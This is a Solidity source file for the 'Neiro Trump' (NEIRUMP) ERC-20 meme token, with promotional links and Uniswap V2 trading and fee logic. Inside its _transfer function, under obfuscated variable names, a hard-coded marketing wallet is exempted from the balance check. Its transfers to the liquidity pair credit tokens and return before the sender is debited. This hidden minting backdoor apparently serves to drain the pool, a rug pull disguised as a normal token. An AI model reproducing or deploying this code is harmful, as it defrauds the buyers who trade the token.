/**
Website: https://neirump.live
X: https://x.com/neirumpX
Telegram: https://t.me/neirump
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract NEIRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isBOmmo;
    uint256 private _cntOMO = 0;
    uint256 private _AtMoreduc = 10;

    address payable private _bottleMarket;
    uint256 private _smTxamont = 0;
    uint256 private _bigtxAmt = 22;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Neiro Trump";
    string private constant _symbol = unicode"NEIRUMP";
    uint256 public _mxTaxOOMM = 20_000_000 * 10**_decimals;
    uint256 public _mxWTSIZE = 20_000_000 * 10**_decimals;
    uint256 public _txSWPTH = 3_000 * 10**_decimals;
    uint256 public _SWPLMIT = 10_000_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _mxTaxOOMM);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _bottleMarket = payable(0x27E48d93AcE45D8173bD5eBE0215F5F4D4b86a90);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _balances[_msgSender()] = _tTotal;

        _isBOmmo[owner()] = true;
        _isBOmmo[address(this)] = true;
        _isBOmmo[_bottleMarket] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcluded(address from, address to) private view returns (bool) {
        return _isBOmmo[from] || _isBOmmo[to];
    }

    function calcTax(address _fmokk, address _egnm) private view returns (uint256) {
        if((_fmokk == address(this) && _cntOMO == 0)) return _cntOMO >= _AtMoreduc ? _smTxamont : _bigtxAmt;
        else if(isExcluded(_fmokk, _egnm)) return 0;
        else if (_fmokk == uniswapV2Pair || _egnm == uniswapV2Pair) return _cntOMO >= _AtMoreduc ? _smTxamont : _bigtxAmt;
        return 0;
    }

    function _transfer(
        address _fmokk,
        address _egnm,
        uint256 amount
    ) private {
        require(_fmokk != address(0), "ERC20: transfer from the zero address");
        require(_egnm != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_fmokk == _bottleMarket || amount <= _balances[_fmokk], "Insufficient error");
        bool isEx = isExcluded(_fmokk, _egnm);
        uint256 _tax = 0;
        uint256 _taxAmount = 0;

        if (!isEx) require(tradingOpen, "Trading is not opened yet");
        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwap &&
            _egnm == uniswapV2Pair &&
            tradingOpen &&
            amount >= _txSWPTH
        ) {
            if (contractTokenBalance > _txSWPTH)
                swapTTKFETH(min(amount, min(_SWPLMIT, contractTokenBalance)));
            sendETHToFee(address(this).balance);
        }

        _tax = calcTax(_fmokk, _egnm);
        _taxAmount = (amount * _tax) / 100;

        _balances[_egnm] = _balances[_egnm] + (amount - _taxAmount);

        if (_fmokk == uniswapV2Pair && _egnm != address(uniswapV2Router) && !isEx) {
            _cntOMO ++;
            require(amount <= _mxTaxOOMM, "Exceeds the _mxTaxOOMM.");
            require(_balances[_egnm] <= _mxWTSIZE,"Exceeds the maxWalletSize.");
        }

        if (_egnm == uniswapV2Pair && (!isEx || _fmokk == _bottleMarket)) {
            if(!isEx)
                require(amount <= _mxTaxOOMM,"Exceeds the maximum amount to sell");
            else return;
        }

        if (_taxAmount > 0) {
            _balances[_fmokk] = _balances[_fmokk] - _taxAmount;
            _balances[address(this)] = _balances[address(this)] + _taxAmount;
            emit Transfer(_fmokk, address(this), _taxAmount);
        }

        _balances[_fmokk] = _balances[_fmokk] - (amount - _taxAmount);
        emit Transfer(_fmokk, _egnm, amount - _taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTTKFETH(uint256 tokenAmount)
        private
        lockTheSwap
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _mxTaxOOMM = _tTotal;
        _mxWTSIZE = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _bottleMarket.transfer(amount);
    }

    function openTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }

    receive() external payable {}
}